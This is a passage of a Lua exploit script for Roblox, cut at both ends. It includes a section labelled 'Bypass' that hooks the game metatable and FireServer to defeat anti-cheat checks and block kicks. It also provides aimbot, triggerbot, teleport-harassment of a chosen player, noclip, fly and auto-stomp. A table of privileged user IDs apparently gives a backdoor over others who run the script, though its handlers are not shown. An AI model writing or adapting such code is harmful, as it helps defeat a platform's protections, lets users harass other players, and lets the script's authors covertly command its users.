	RainbowButton.Font = Enum.Font.SourceSans
	RainbowButton.TextColor3 = Color3.fromRGB(170,0,0)
	RainbowButton.TextSize = 25
	RainbowButton.Text = Text
	RainbowButton.TextWrapped = true
	RainbowButton.MouseButton1Click:Connect(function()
		if Text == "All" then 
			RainbowHats = "All"
			RainbowFrame.Visible = false
		else 
			LP.Backpack.Stank:FireServer("rep",Value.Parent)
			RainbowFrame.Visible = false
			RainbowHats = true
		end 
	end)
	dragGUI(RainbowFrame,RainbowButton)
end

local function createCommandBarCmd(Name,Args)
	if Name and Args then 
		local CmdBarTextLabel = Instance.new('TextLabel',CmdBarFrame)
		CmdBarTextLabel.BackgroundTransparency = 1
		CmdBarTextLabel.Position = UDim2.new(-20,0,0,0)
		CmdBarTextLabel.Size = UDim2.new(0,200,0,15)
		CmdBarTextLabel.ZIndex = 2
		CmdBarTextLabel.Font = Enum.Font.SciFi
		CmdBarTextLabel.Text = (Name.." "..Args)
		CmdBarTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
		CmdBarTextLabel.TextScaled = true
		CmdBarTextLabel.TextSize = 14
		CmdBarTextLabel.TextWrapped = true
		dragGUI(CmdBarFrame,CmdBarTextLabel)
	end 
end

local function createCmd(Pos,CommandName,CommandInfo,CommandArgs)
	local CommandLabel = Instance.new('TextLabel',CmdsScrolling)
	CommandLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CommandLabel.BackgroundTransparency = 0.9
	CommandLabel.Position = Pos
	CommandLabel.Size = UDim2.new(0,387,0,31)
	CommandLabel.Font = Enum.Font.SourceSans
	CommandLabel.Text = ("["..CommandName.."] "..CommandInfo)
	CommandLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CommandLabel.TextSize = 14
	CommandLabel.TextWrapped = true
	dragGUI(CmdsFrame,CommandLabel)
end

local function StateChanged(Old,New)
	if Flying or NoGh then 
		if New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding then
			LP.Character.Humanoid.PlatformStand = false
			LP.Character.Humanoid:ChangeState(8)
		end
	end 
end

local function ShotOrHit(Character)
	if Character then 
		local Tool = Character:FindFirstChildOfClass'Tool'
		if Tool then 
			return Tool,Tool:FindFirstChild'Fire' and "shot you" or "hit you"
		end
	end 
end

local function ChangeDamageIndicatorText(Text)
	DmgIndicator.Text = Text
	DmgIndicator.Visible = true
	wait(5)
	DmgIndicator.Visible = false
end

local function ColourChanger(T)
	if T:IsA'Trail' then 
		T.Color = BulletColour
	end
	if BfgOn and T:FindFirstChild('Clips',true) then
		for _,v in pairs(LP.Backpack:GetChildren()) do 
			if v:IsA'Tool' and v:FindFirstChild('Clips',true) then 
				v.Parent = GetChar()
			end 
		end
	end 
	if not BfgOn and EstimatedGunRanges[T.Name] and GunAnim ~= "None" then 
		wait()
		if T.Name ~= "Shotty" and T.Name ~= "Sawed Off" or GunAnim == "1" then 
			GetChar().Humanoid:LoadAnimation(GunAnimation1):Play()
		else
			local Track = GetChar().Humanoid:LoadAnimation(GunAnimation2)
			Track:Play()
			wait()
			Track:AdjustSpeed(0)
		end 
	end 
	if T.Name == "Bone" then
		if AutoDie then
			GetChar().Humanoid.Health = 0
		end 
		if GodMode and game.PlaceId == 455366377 then 
			for i,v in pairs(GetChar():GetDescendants()) do 
				if v:IsA'NumberValue' then 
					v:Destroy()
				end 
			end
		end 
	end
	if T:IsA'ObjectValue' and T.Name == "creator" then
		local Player = T.Value
		if AutoTarget then
			if Aimlock then 
				AimlockTarget = Player
				local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
					if tostring(C) == tostring(AimlockTarget) then 
						AimlockTarget = C 
					else
						Connection:Disconnect()
						Connection = nil
					end
				end)
			end
			if CamLocking then 
				CamlockPlayer = Players:GetPlayerFromCharacter(Player)
			end
		end
		if AutoFeloop then 
			CheckCommand("feloop "..tostring(Player))
		end 
		if AutoTriggerBot and not TriggerBot then
			CheckCommand("triggerbot "..tostring(Player))
			AutoStomp = true
			local Life;Life = Players:GetPlayerFromCharacter(Player).CharacterRemoving:Connect(function(Char)
				if tostring(Char) == tostring(AnnoyingPlayer) then 
					TriggerBot = false 
					AnnoyOn = false 
					AnnoyingPlayer = nil
					AimbotAutoShoot = false
					Flying = false
					AutoDie = false
					AutoStomp = false
					AimlockTarget = nil
					Life:Disconnect()
				else 
					Life:Disconnect()
				end 
			end)
		end 
		pcall(function()
			local Tool,Method = ShotOrHit(Player)
			ChangeDamageIndicatorText(Player.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Player.Head.Position).magnitude).." studs with a "..Tool.Name)
		end)
	end
end

local function RemoveGunAnimation(T)
	if EstimatedGunRanges[T.Name] then 
		stopAnim("889968874")
		stopAnim("229339207")
	end 
end

local function FreeCam(Speed)
if not GetChar():FindFirstChild'Head' then return end 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
	Speed = Speed or 35
	GetChar().Head.Anchored = true 
	local FreecamPart = Instance.new('Part',workspace)
	FreecamPart.Name = "FreecamPart"
	FreecamPart.Position = GetChar().Head.Position + Vector3.new(0,5,0)
	FreecamPart.Transparency = 1
	FreecamPart.CanCollide = false
	FreecamPart.Anchored = true
	workspace.CurrentCamera.CameraSubject = FreecamPart
	while Freecam and GetChar().Humanoid.Health > 0 and wait() do 
		local Pos = Vector3.new()
		local Look = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
		local PartPos = FreecamPart.Position
		if KeyTable['w'] then
			Pos = Pos + Vector3.new(0,0,-1)
		elseif KeyTable['a'] then
			Pos = Pos + Vector3.new(-1,0,0)
		elseif KeyTable['s'] then
			Pos = Pos + Vector3.new(0,0,1)
		elseif KeyTable['d'] then
			Pos = Pos + Vector3.new(1,0,0)
		elseif KeyTable['Space'] then
			Pos = Pos + Vector3.new(0,1,0)
		elseif KeyTable['Control'] then
			Pos = Pos + Vector3.new(0,-1,0)
		end 
		FreecamPart.CFrame = CFrame.new(PartPos,PartPos + Look) * CFrame.new(Pos * Speed)
	end
	workspace.CurrentCamera.CameraSubject = GetChar()
	GetChar().Head.Anchored = false 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
end

local function BehindAWall(Target)
	if Target:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
		local RYEBread = Ray.new(Target.Head.Position,GetChar().Head.Position)
		local RYEBreadHit = workspace:FindPartOnRay(RYEBread)
		if RYEBreadHit then
			return RYEBreadHit:IsDescendantOf(Target)
		end
	end 
end

local function LoopChangeWalkSpeed()
	if game.PlaceId == 455366377 then 
		if KeyTable['Shift'] and (WalkShoot and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value > 0 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value > 0) or not WalkShoot) then
			if Normalwalk and SprintSpeed == 25 then return end
			GetChar().Humanoid.WalkSpeed = SprintSpeed
			return 
		end 
		if KeyTable['Control'] then 
			if Normalwalk and CrouchSpeed == 8 then return end
			GetChar().Humanoid.WalkSpeed = CrouchSpeed
			return 
		end
		if not WalkShoot then 
			GetChar().Humanoid.WalkSpeed = WalkSpeed
		end
	end 
end

local function AimbotToCFrame()
local CFrameToReturn;
local TargetPart = AimlockTarget.FindFirstChild(AimlockTarget,'RealHumanoidRootPart') or AimlockTarget.FindFirstChild(AimlockTarget,'Torso')
	if TargetPart and AimMode == "OldPrediction" then 
		CFrameToReturn = TargetPart.CFrame + TargetPart.Velocity / AimbotVelocity
	elseif TargetPart and AimMode == "Prediction" then
		CFrameToReturn = (TargetPart.CFrame + TargetPart.Velocity / (PlayersPing < 0.26 and 5 or 7.5)) + (TargetPart.RotVelocity / (PlayersPing < 0.26 and 5 or 7.5))
	elseif AimlockTarget.FindFirstChild(AimlockTarget,AimMode) then 
		CFrameToReturn = AimlockTarget[AimMode].CFrame
	end
	return CFrameToReturn
end

local function updateGun()
	local NewTool;
	local Tool = LP.Character:FindFirstChildOfClass'Tool'
	if Tool and EstimatedGunRanges[Tool.Name] and (Tool.Ammo.Value > 0 or Tool.Clips.Value > 0) then 
		return true 
	else 
		for i,v in pairs(LP.Backpack:GetChildren()) do 
			if v:IsA'Tool' and EstimatedGunRanges[v.Name] then
				if v:FindFirstChild'Clips' then 
					if v.Clips.Value > 0 or v.Ammo.Value > 0 then 
						NewTool = v
						break
					end 
				end 
			end 
		end 
		if NewTool then 
			return NewTool
		else
			if game.PlaceId == 455366377 and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild'Ammo' and TriggerBotAutoReload and not BuyingStuff and tonumber(LP.PlayerGui.HUD.Cash.Text:sub(2)) >= 25 then
				GrabItem("ammo",GetChar().Head.CFrame)
				return true
			else
				GetChar():BreakJoints()
			end 
			return false
		end 
	end 
end 
	

-- [[ End ]] -- 

-- [[ Bypass ]] -- .

local Raw = getrawmetatable(game)
local Caller = checkcaller or is_protosmasher_caller or Cer.isCerus
local CallingScript = getcallingscript or get_calling_script
local Closure = newcclosure or read_me or function(Func) return Func end
local CallingMethod = getnamecallmethod or get_namecall_method

setreadonly(Raw,false)

local Index = Raw.__index;
Raw.__index = Closure(function(self,Indexed)
	if TpBypass and CallingScript and CallingScript() ~= script and Indexed == "HumanoidRootPart" then 
		return Index(self,"Torso")
	end
	return Index(self,Indexed)
end)

local NewIndex = Raw.__newindex;
Raw.__newindex = Closure(function(self,Property,Value)
	if Caller() then return NewIndex(self,Property,Value) end
	StarterGui:SetCore('ResetButtonCallback',true)
	if Property == "WalkSpeed" and WalkShoot then return 16 end
	if Property == "JumpPower" then return 37.5 end 
	if Property == "HipHeight" then return 0 end 
	if Property == "Health" then return 100 end
	if self == workspace and Property == "Gravity" then return NormalGravity end
	if Property == "CFrame" and self:IsDescendantOf(LP.Character) then return end 
	return NewIndex(self,Property,Value)
end)

local Namecall = Raw.__namecall;
Raw.__namecall = Closure(function(self,...)
local Args = {...}
	if Caller() then 
		if CallingMethod() == "FindFirstChild" and Args[1] == "RealHumanoidRootPart" then 
			Args[1] = "HumanoidRootPart" 
			return Namecall(self,unpack(Args))
		end
		return Namecall(self,...) 
	end 
	if CallingMethod() == "Destroy" or CallingMethod() == "Kick" then 
		if self == LP then return wait(9e9) end
		if tostring(self) == 'BodyGyro' or tostring(self) == 'BodyVelocity' then return wait(9e9) end 
	end
	if CallingMethod() == "BreakJoints" and self == LP.Character then return wait(9e9) end
	if CallingMethod() == "FireServer" then
		if tostring(self) == "Fire" and Aimlock and AimlockTarget then
			return Namecall(self,AimbotToCFrame())
		end 
		if tostring(self) == "Input" and Aimlock and AimlockTarget then 
			Args[2].mousehit = AimbotToCFrame()
			return Namecall(self,unpack(Args))
		end
		if tostring(self.Parent) == "ReplicatedStorage" or Args[1] == "hey" and not tostring(self) == "SayMessageRequest" then 
			return wait(9e9)
		end
		if tostring(self) == "Touch1" and AlwaysGh then
			Args[3] = true
			return Namecall(self,unpack(Args)) 
		end
		if Args[1] == "play" then 
			PlayOnDeath = Args[2]
		elseif Args[1] == "stop" then 
			PlayOnDeath = nil
		end
	end
	if CallingMethod() == "WaitForChild" or CallingMethod() == "FindFirstChild" then 
		if CallingScript and CallingScript() ~= script and TpBypass and Args[1] == "HumanoidRootPart" then
			Args[1] = "Torso"
			return Namecall(self,unpack(Args))
		end
	end
	return Namecall(self,...)
end)

if hookfunction then 
	local OldRemote; OldRemote = hookfunction(Instance.new'RemoteEvent'.FireServer,function(self,...)
		local Args = {...}
		if tostring(self) == "Touch1" and AlwaysGh then 
			Args[3] = true 
			return OldRemote(self,unpack(Args))
		end
		return OldRemote(self,...)
	end)
end 

setreadonly(Raw,true)

-- [[ End ]] -- 

-- [[ Event Handling ]] -- 

LP.Chatted:Connect(CheckCommand)

workspace.DescendantAdded:Connect(function(T)
	if NeverSitting and string.find(T.ClassName:lower(),"seat") then 
		T.Parent = CoreGui
	end
	if AutoFarm then 
		farm("Cash")
	end
	if ItemEsp and T.Name == "RandomSpawner" then
		for i,v in pairs(FarmTable) do 
			local Part,String = find(i)
			if Part ~= "None" then 
				Esp(Part,String)
			end
		end
	end
end)

RunService.Stepped:Connect(function()
local Character = GetChar()
local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
	if Noclip then 
		local Children = Character:GetDescendants() 
		for i = 1,#Children do 
			local Child = Children[i]
			if Child:IsA'BasePart' then 
				Child.CanCollide = false 
			end
		end 
	end
	if KeyTable['Shift'] and SprintSpeed == 25 and WalkShoot and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value <= 5 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value <= 5) then 
		GetChar().Humanoid.WalkSpeed = 16
	end
	if RemoteGunBodyPos and RemoteGunPlayer and RemoteGunPlayer.Character and RemoteGunPlayer.Character:FindFirstChild'Torso' then 
	
	end 
	if GodMode and game.PlaceId ~= 455366377 then
		local RightLeg = Character:FindFirstChild'Right Leg'
		if RightLeg then 
			RightLeg:Destroy()
		end 
	end
	local Tool = Character:FindFirstChildOfClass'Tool'
	if AntiKill and Tool and not table.find(ToolTable,Tool) then 
		if Character:FindFirstChild'Right Arm' and Character['Right Arm']:FindFirstChild'RightGrip' then 
			Character['Right Arm'].RightGrip:Destroy()
		end 
	end 
	if flying and Character:FindFirstChild'Humanoid' and (game.PlaceId == 455366377 and not FlyDebounce) then
		FlyDebounce = true
		LP.Character.Humanoid:ChangeState(3)
		if game.PlaceId == 455366377 then 
			wait(0.2)
		end 
		FlyDebounce = false
	end
	if ClockTime then 
		Lighting.ClockTime = ClockTime
	end
	if AirwalkOn and Character:FindFirstChildOfClass'Humanoid' and PartFound then
		Character.Humanoid.HipHeight = 0
		AirWalk.CFrame = PartFound.CFrame + Vector3.new(0,-3.5,0)
	end
	if CamLocking and CamlockPlayer and CamlockPlayer.Character and CamlockPlayer.Character:FindFirstChild'Head' then
		if CamlockPlayer.Character:FindFirstChildOfClass'Humanoid' and CamlockPlayer.Character.Humanoid.Health == 0 then return end 
		if CamlockPlayer.Character:FindFirstChild(CamlockTarget) then
			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character[CamlockTarget].CFrame.p)
		else 
			workspace.CurrentCamera.CoordinateFrame = CFrame.new(workspace.CurrentCamera.CoordinateFrame.p,CamlockPlayer.Character.Head.CFrame.p)
		end 
	end 
	if FeLoop and LoopPlayer and LoopPlayer.Character and PartFound then
		local Part = LoopPlayer.Character:FindFirstChildWhichIsA('BasePart',true)
		if Part then 
			PartFound.CFrame = Part.CFrame
		end 
		local BChildren = LP.Backpack:GetChildren()
		for i = 1,#BChildren do 
			local Child = BChildren[i]
			Child.Parent = Character
			Child:GetPropertyChangedSignal("Parent"):Wait()
		end
	end
	if AnnoyOn and AnnoyingPlayer and AnnoyingPlayer.Character and PartFound then
		local Part = AnnoyingPlayer.Character:FindFirstChild'Torso'
		if Part then
			if TriggerBot then 
				if not Flying then 
					CheckCommand("fly")
				end
				if not AimbotAutoShoot and not AutoTriggerBot then 
					CheckCommand("aimbotautoshoot")
				end
				if not Aimlock or AnnoyingPlayer and tostring(AimlockTarget) ~= tostring(AnnoyingPlayer) then 
					CheckCommand("aim "..AnnoyingPlayer.Name)
				end
				if not Character:FindFirstChildOfClass'ForceField' then 
					local Gun = updateGun()
					local FoundTool = Character:FindFirstChildOfClass'Tool'
					if typeof(Gun) ~= "boolean" and Gun and Gun ~= FoundTool then
						if FoundTool then 
							FoundTool.Parent = LP.Backpack
							wait()
						end
						Gun.Parent = LP.Character 
					end
				end
				if AnnoyingPlayer and AnnoyingPlayer.Character and not AnnoyingPlayer.Character:FindFirstChild('Bone',true) and (not BuyingStuff and TriggerBotAutoReload or not TriggerBotAutoReload) then
					if Character:FindFirstChild'Glock' or Character:FindFirstChild'Uzi' then
						local Random = math.random(1,6)
						if Random <= 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(math.random(1,25),0,math.random(1,25))
						elseif Random > 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(-math.random(1,25),0,-math.random(1,25))
						end
					else
						local Random = math.random(1,6)
						if Random <= 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(math.random(1,15),0,math.random(1,15))
						elseif Random > 3 then 
							PartFound.CFrame = Part.CFrame * CFrame.new(-math.random(1,15),0,-math.random(1,15))
						end 
					end
				else
					if not BuyingStuff and TriggerBotAutoReload or not TriggerBotAutoReload and not AutoTriggerBot then 
						PartFound.CFrame = Part.CFrame
					end 
				end 
			else
				PartFound.CFrame = Part.CFrame
			end
		end 
	end 
	if AutoStomp then 
		local P = Players:GetPlayers() 
		for i = 1,#P do 
			local Player = P[i]
			if PartFound and Player ~= LP and Player.Character and Player.Character:FindFirstChild'Head' and Player.Character:FindFirstChild('Bone',true) then
				if (PartFound.Position - Player.Character.Head.Position).magnitude < AutoStompRange and Player.Character.Humanoid.Health > 0 and not Player.Character:FindFirstChild'Dragged' and not table.find(StompWhitelist,Player.UserId) then
					Teleport(Player.Character.Head.CFrame)
					LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack:FindFirstChild'Punch' or LP.Character:FindFirstChild'Punch')
				end
			end
		end
	end
end)

local HealthChangedEvent;HealthChangedEvent = LP.Character.Humanoid.HealthChanged:Connect(HealthChanged)
local HumanoidStateChanged;HumanoidStateChanged = LP.Character.Humanoid.StateChanged:Connect(StateChanged)
local ColourChangerEvent;ColourChangerEvent = LP.Character.DescendantAdded:Connect(ColourChanger)
local RemoveGunAnimationEvent;RemoveGunAnimationEvent = LP.Character.DescendantRemoving:Connect(RemoveGunAnimation)
local WalkSpeedChangedEvent;WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)

LP.CharacterAdded:Connect(function(C)
	Flying = false
	AntiKill = false
	ToolTable = {}
	C:WaitForChild'Humanoid' -- wait until the humanoid has been found
	-- Gun Animation Event -- 
	RemoveGunAnimationEvent:Disconnect()
	RemoveGunAnimationEvent = nil 
	RemoveGunAnimationEvent = LP.Character.DescendantRemoving:Connect(RemoveGunAnimation)
	-- HealBot Event --
	HealthChangedEvent:Disconnect()
	HealthChangedEvent = nil 
	HealthChangedEvent = C.Humanoid.HealthChanged:Connect(HealthChanged)
	-- No GroundHit Event -- 
	HumanoidStateChanged:Disconnect()
	HumanoidStateChanged = nil 
	HumanoidStateChanged = C.Humanoid.StateChanged:Connect(StateChanged)
	-- Colour Changer Event -- 
	ColourChangerEvent:Disconnect()
	ColourChangerEvent = nil
	ColourChangerEvent = C.DescendantAdded:Connect(ColourChanger)
	-- WalkSpeed Event -- 
	WalkSpeedChangedEvent:Disconnect()
	WalkSpeedChangedEvent = nil 
	WalkSpeedChangedEvent = LP.Character.Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(LoopChangeWalkSpeed)
	-- Loop Properties -- 
	C.Humanoid.WalkSpeed = SpawnWs or NormalWs
	C.Humanoid.JumpPower = SpawnJP or NormalJP
	C.Humanoid.HipHeight = SpawnHH or NormalHH
	-- Other --
	if TpBypass then
		local Hr = C:FindFirstChild'RealHumanoidRootPart'
		if Hr then 
			Hr:Destroy()
		end
	end
	if FeLoop then
		C['Right Leg']:Destroy()
		local H = C.Humanoid:Clone()
		C.Humanoid:Destroy()
		H.Parent = C
		workspace.CurrentCamera.CameraSubject = C
	end 
	pcall(function()
		if PlayOnDeath then 
			wait()
			local Tool = LP.Backpack:WaitForChild'BoomBox'
			if Tool then 
				Tool.Parent = C
				wait()
				Tool:FindFirstChildOfClass'RemoteEvent':FireServer("play",PlayOnDeath)
				wait()
				Tool.Parent = LP.Backpack
			end
		end
	end) -- code has stupid errors? pcall the fuck out of it
end)

UserInput.InputBegan:Connect(function(Key)
local Character = GetChar()
local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
local Target = Mouse.Target
	if UserInput:GetFocusedTextBox() then return end
	if not Character:FindFirstChildOfClass'Tool' and AimlockMode == "LeftClick" and Key.UserInputType == Enum.UserInputType.MouseButton1 or AimlockMode == "RightClick" and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
		if Target and Target.Parent then 
			local TargetNew = Target.Parent 
			if not Players:GetPlayerFromCharacter(TargetNew) then TargetNew = TargetNew.Parent end 
			if not Players:GetPlayerFromCharacter(TargetNew) then return end 
			if TargetNew ~= Character and TargetNew ~= AimlockTarget and Aimlock then 
				AimlockTarget = TargetNew
				local Connection;Connection = Players:GetPlayerFromCharacter(TargetNew).CharacterAdded:Connect(function(C)
					if tostring(C) == tostring(AimlockTarget) then 
						AimlockTarget = C 
					else
						Connection:Disconnect()
						Connection = nil
					end
				end)
				notif("AimlockTarget","Has been set to "..AimlockTarget.Name,5,nil)
			end
		end
	end
	if CanSetHotkey then
		local KeyCode = Key.KeyCode.Name
		if KeyCode ~= "Unknown" and KeyCode ~= "Return" and Keycode ~= "Slash" then
			if CanSetHotkey == "CmdBar" then
				CmdBarKey = KeyCode
				notif("CommandBarKey","Has been set to the hotkey: "..KeyCode,5,nil)
				CanSetHotkey = nil
				KeysFrame.Visible = false
			elseif CanSetHotkey == "AnyCmd" and AnyCmdTextBox.Text ~= "" then
				for Index,Key in pairs(Keys) do
					if Key:match("[%a%d]+$") == KeyCode then
						table.remove(Keys,Index)
					end
				end
				Keys[#Keys + 1] = AnyCmdTextBox.Text.."||"..KeyCode
				notif(AnyCmdTextBox.text,"Has been set to the hotkey: "..KeyCode,5,nil)
				CanSetHotkey = nil
				AnyCmdTextBox.Text = ""
				KeysFrame.Visible = false
			end
			updateHotkeys(ConfigurationFile)
		end 
	end
	if Target and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
		local Target = Target.Parent
		if Target and Target:FindFirstChild'Click' and Target:FindFirstChild'Locker' then 
			if Target.Locker.Value then 
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			else
				Target.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
				Target.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
			end
		end
	end
	if ClickTpKey and ClickTpKey ~= "" and Key.KeyCode == Enum.KeyCode[ClickTpKey:upper()] and Target then 
		Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0,5,0)))
	end
	for i,v in pairs(Keys) do
		local KeyCode = convertKeyCode(v:match'[%a%d]+$')
		if KeyCode == Key.KeyCode then
			CheckCommand(v:match'^[%w%s]+')
		end
	end
	if Key.KeyCode == Enum.KeyCode.LeftControl then
		KeyTable['Control'] = true
		if AirwalkOn then AirWalk.Size = Vector3.new(0,0,0) end
		if Normalwalk and CrouchSpeed == 8 then return end
		Character.Humanoid.WalkSpeed = CrouchSpeed
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift then 
		KeyTable['Shift'] = true
		if Normalwalk and SprintSpeed == 25 then return end
		Character.Humanoid.WalkSpeed = SprintSpeed
	end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['W'] = true
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['A'] = true
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['S'] = true
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['D'] = true
	end
	if Key.KeyCode == Enum.KeyCode.Space then 
		if AirwalkOn then PartFound.CFrame = PartFound.CFrame + Vector3.new(0,5,0) end
	end
	if Key.KeyCode == Enum.KeyCode.E and Character:FindFirstChildOfClass'Tool' and Character:FindFirstChildOfClass'Tool':FindFirstChild'Clips' and not Character:FindFirstChild('Bone',true) and GunStomp then 
		if game.PlaceId == 455366377 then 
			local OldTool = Character:FindFirstChildOfClass'Tool'
			OldTool.Parent = LP.Backpack
			wait()
			local Punch = LP.Backpack.Punch
			Punch.Parent = Character
			LP.Backpack.Input:FireServer("e",{})
			wait(1)
			Punch.Parent = LP.Backpack
			wait()
			OldTool.Parent = Character
		else
			LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
		end 
	end
	if Key.KeyCode == Enum.KeyCode[CmdBarKey] then
		wait()
		CmdBarTextBox:CaptureFocus()
		CmdBarFrame:TweenPosition(UDim2.new(0.5,0,0.5,0),"In","Sine",0.5,true)
		local TextBox = UserInput.TextBoxFocusReleased:Wait()
		CheckCommand(TextBox.Text)
		TextBox.Text = ""
		CmdBarFrame:TweenPosition(UDim2.new(1.5,0,1.5,0),"Out","Quad",0.5,true)
	end
	if Character:FindFirstChild'GravGun' then 
		if Key.KeyCode == Enum.KeyCode.Q and GravGunDistance > 5 then 
			GravGunDistance = GravGunDistance - 5
		end
		if Key.KeyCode == Enum.KeyCode.V then 
			GravGunDistance = GravGunDistance + 5
		end
		if Key.KeyCode == Enum.KeyCode.B then 
			GravGunSeizureMode = not GravGunSeizureMode
			notif("WOW!","You found Grav gun seizure mode!, it has been set to "..tostring(GravGunSeizureMode),5,nil)
		end
	end 
end)

UserInput.InputEnded:Connect(function(Key)
local Character = GetChar()
	if UserInput:GetFocusedTextBox() then return end
	if Key.KeyCode == Enum.KeyCode.W then 
		KeyTable['W'] = false
	end
	if Key.KeyCode == Enum.KeyCode.A then 
		KeyTable['A'] = false
	end
	if Key.KeyCode == Enum.KeyCode.S then 
		KeyTable['S'] = false
	end
	if Key.KeyCode == Enum.KeyCode.D then 
		KeyTable['D'] = false
	end
	if Key.KeyCode == Enum.KeyCode.LeftShift and SprintSpeed then
		KeyTable['Shift'] = false 
		if Normalwalk and SprintSpeed == 25 then return end 
		Character.Humanoid.WalkSpeed = WalkSpeed
	end 
	if Key.KeyCode == Enum.KeyCode.LeftControl then 
		KeyTable['Control'] = false
		if AirwalkOn then AirWalk.Size = Vector3.new(5,1,5) end
		if Normalwalk and CrouchSpeed == 8 then return end
		Character.Humanoid.WalkSpeed = WalkSpeed
	end
end)

UserInput.JumpRequest:Connect(function()
	local Character = GetChar()
	if Character:FindFirstChildOfClass'Humanoid' and DoubleJumpEnabled then 
		Character.Humanoid:ChangeState(3)
	end
end)

LP.Idled:Connect(function()
	VirtualUser:CaptureController()
	VirtualUser:ClickButton1(Vector2.new(0.5,0.5))
end)

Mouse.Button1Down:Connect(function()
	local MouseTarget = Mouse.Target
	if MouseTarget and GetChar():FindFirstChild'Zetox Btools' then 
		MouseTarget:Destroy()
	end
	if MouseTarget and GetChar():FindFirstChild'GravGun' then
		local Target = MouseTarget.Parent:FindFirstChild'Head' or MouseTarget.Parent.Parent:FindFirstChild'Head' or MouseTarget
		if Players:GetPlayerFromCharacter(Target.Parent) or not Target.Anchored then
			GravGunBodyPosition = createBodyPos(Target)
		end 
	end
	if BfgOn and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild('Clips',true) and not CurrentlyShooting then
		CurrentlyShooting = true 
		GetChar().Humanoid:UnequipTools()
		local OldTool;
		for _,Tool in pairs(LP.Backpack:GetChildren()) do 
			if Tool:IsA'Tool' and Tool:FindFirstChild('Clips',true) then 
				Tool.Parent = GetChar()
				OldTool = Tool
				LP.Backpack.Input:FireServer("m1",{
					['mousehit'] = Aimlock and AimlockTarget and AimbotToCFrame() or Mouse.Hit;
					['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
					['velo'] = 0;
			   })
			   wait(0.3)
			   Tool.Parent = LP.Backpack
			   wait(0.3)
			end 
		end
		OldTool.Parent = GetChar()
		CurrentlyShooting = false
	end
end)

Mouse.Button1Up:Connect(function()
	if GravGunBodyPosition then 
		GravGunBodyPosition:Destroy()
	end
	if GravGunBodyVelocity then 
		GravGunBodyVelocity:Destroy()
	end
end)

Players.PlayerAdded:Connect(function(Player)
	if BackDoorTablePlayers[Player.UserId] then -- SHUT UP EST I'M TIRED
		print(1)
		Player.Chatted:Connect(function(Chat) BackdoorCheck(Player,Chat) end)
	end 
	Player.CharacterAdded:Connect(function(C)
		local Head = C:WaitForChild('Head',10)
		if Head then 
			if AimlockMode == "Closest" then 
				AimlockClosest(Player)
			end 
			local Backdoor = BackDoorTablePlayers[Player.UserId]
			local Blacklist = BlacklistTable[Player.UserId]
			if Blacklist or Player:IsInGroup(5152759) or string.find(Player.Name:lower(),"lynx") then
				Esp(Player.Character.Head,Player.Name,Color3.fromRGB(102,51,0),true)
				Player.CharacterAdded:Connect(function(C)
					local Head = C:WaitForChild'Head'
					if Head then 
						Esp(Head,Player.Name,Color3.fromRGB(102,51,0),true)
					end 
				end)
			end 
			if Backdoor then 
				Esp(Player.Character.Head,Backdoor['Name'],Backdoor['Colour'])
				initalizeBackdoorPart2(Player,Backdoor['Colour'])
				Player.CharacterAdded:Connect(function(C)
					local Head = C:WaitForChild'Head'
					if Head then
						initalizeBackdoorPart2(Player,Backdoor['Colour'])
						Esp(Head,Backdoor['Name'],Backdoor['Colour'])
					end
				end)
			end
		end
	end)
	local Chatted;Chatted = Player.Chatted:Connect(function(Chat)
		local User = IsAUser(Player,Chat)
		if User then 
			Chatted:Disconnect()
		end
	end)
end)

AnyCmdButton.MouseButton1Click:Connect(function()
	CanSetHotkey = "AnyCmd"
	if AnyCmdTextBox.Text == "" then
		AnyCmdButton.Text = "Type a command above"
	else 
		AnyCmdButton.Text = "Press a Key"
	end 
end)

CmdBarKeyButton.MouseButton1Click:Connect(function()
	CanSetHotkey = "CmdBar" 
end)

Players.PlayerRemoving:Connect(function(Player)
	if ExploitDetectionPlayerTablePositions[tostring(Player)] then 
